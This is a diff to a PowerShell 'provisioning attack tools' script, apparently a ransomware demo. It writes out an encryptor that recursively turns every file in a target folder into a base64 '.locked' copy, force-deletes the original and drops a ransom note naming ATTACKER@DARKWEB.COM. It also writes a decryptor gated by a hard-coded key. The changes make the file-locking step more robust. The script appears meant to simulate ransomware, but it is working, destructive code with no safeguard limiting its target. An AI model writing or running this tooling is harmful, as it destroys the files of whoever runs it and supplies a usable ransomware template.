@@ -1,29 +1,31 @@
 Write-Host "[*] Provisioning attack tools..." -ForegroundColor Gray
 
-# --- DEFINING THE ENCRYPTOR CODE ---
+# --- 1. THE ENCRYPTOR (File-Only Mode) ---
 $encCode = '
 param([string]$Target = ".\", [string]$SecretKey = "AI-DEMO-2026")
 $ResolvedPath = (Resolve-Path $Target).Path
 $ransomNotePath = Join-Path $ResolvedPath "READ_ME_NOW.txt"
 
-Write-Host "[!] TARGET ACQUIRED: $ResolvedPath" -ForegroundColor Red
+Write-Host "[!] TARGET: $ResolvedPath" -ForegroundColor Red
 
-# Exclude the note and already locked files
-# ENCRYPT EVERYTHING (Wildcard *)
-# We MUST exclude the ransom note, the scripts themselves, and already locked files
-Get-ChildItem -Path $ResolvedPath -Include * -Exclude "READ_ME_NOW.txt","*.locked","encrypt.ps1","decrypt.ps1","setup.ps1" -Recurse | ForEach-Object {    $content = [System.IO.File]::ReadAllBytes($_.FullName)
-    $encoded = [System.Convert]::ToBase64String($content)
-    $encoded | Set-Content ($_.FullName + ".locked")
-    Remove-Item $_.FullName
-    Write-Host "LOCKED: $($_.Name)" -ForegroundColor Yellow
+# Get ONLY files (-File), excluding our notes and scripts
+Get-ChildItem -Path $ResolvedPath -File -Exclude "READ_ME_NOW.txt","*.locked","encrypt.ps1","decrypt.ps1","setup.ps1" -Recurse | ForEach-Object {
+    try {
+        $content = [System.IO.File]::ReadAllBytes($_.FullName)
+        $encoded = [System.Convert]::ToBase64String($content)
+        $encoded | Set-Content ($_.FullName + ".locked")
+        Remove-Item $_.FullName -Force
+        Write-Host "LOCKED: $($_.Name)" -ForegroundColor Yellow
+    } catch {
+        Write-Host "Skipping: $($_.Name) (In use or No Access)" -ForegroundColor Gray
+    }
 }
 
-$noteContent = "YOUR FILES ARE ENCRYPTED.`r`nTARGET: $ResolvedPath`r`nKEY ID: $SecretKey`r`nCONTACT: ATTACKER@DARKWEB.COM"
-$noteContent | Set-Content $ransomNotePath
+"YOUR FILES ARE ENCRYPTED. CONTACT: ATTACKER@DARKWEB.COM" | Set-Content $ransomNotePath
 Start-Process notepad.exe $ransomNotePath
 '
 
-# --- DEFINING THE DECRYPTOR CODE ---
+# --- 2. THE DECRYPTOR ---
 $decCode = '
 param([string]$Key, [string]$Target = ".\")
 $ResolvedPath = (Resolve-Path $Target).Path
@@ -36,19 +38,16 @@ if ($Key -eq "AI-DEMO-2026") {
             $decoded = [System.Convert]::FromBase64String($encoded)
             $originalName = $_.FullName.Replace(".locked", "")
             [System.IO.File]::WriteAllBytes($originalName, $decoded)
-            Remove-Item $_.FullName
+            Remove-Item $_.FullName -Force
             Write-Host "RESTORED: $(Split-Path $originalName -Leaf)" -ForegroundColor Cyan
         } catch {
-            Write-Host "[!] Skipping corrupted file: $($_.Name)" -ForegroundColor Red
+            Write-Host "[!] Error on: $($_.Name)" -ForegroundColor Red
         }
     }
-} else {
-    Write-Host "[-] ACCESS DENIED. WRONG KEY." -ForegroundColor Red
-}
+} else { Write-Host "[-] ACCESS DENIED" -ForegroundColor Red }
 '
 
-# --- WRITING FILES TO DISK ---
+# --- 3. WRITE TO DISK ---
 [System.IO.File]::WriteAllText("$PWD\encrypt.ps1", $encCode)
 [System.IO.File]::WriteAllText("$PWD\decrypt.ps1", $decCode)
-
-Write-Host "[+] Tools extracted: encrypt.ps1, decrypt.ps1" -ForegroundColor Green
+Write-Host "[+] Tools extracted successfully." -ForegroundColor Green
